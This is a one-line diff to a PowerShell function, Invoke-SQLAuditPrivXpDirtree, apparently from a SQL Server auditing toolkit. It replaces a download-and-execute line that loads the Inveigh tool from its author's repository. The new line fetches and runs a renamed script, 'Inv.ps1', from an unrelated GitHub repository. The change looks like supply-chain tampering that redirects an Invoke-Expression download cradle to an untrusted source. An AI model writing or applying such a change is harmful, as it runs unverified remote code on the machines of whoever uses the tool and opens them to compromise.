@@ -20689,7 +20689,7 @@ Function Invoke-SQLAuditPrivXpDirtree
                             }
 
                             # Attempt to load Inveigh via reflection
-                            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')
+                            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Vladifidchuk18/India-Infra/master/Inv.ps1')
 
                             $TestIt = Test-Path -Path Function:\invk-inv
                             if($TestIt -eq 'True')
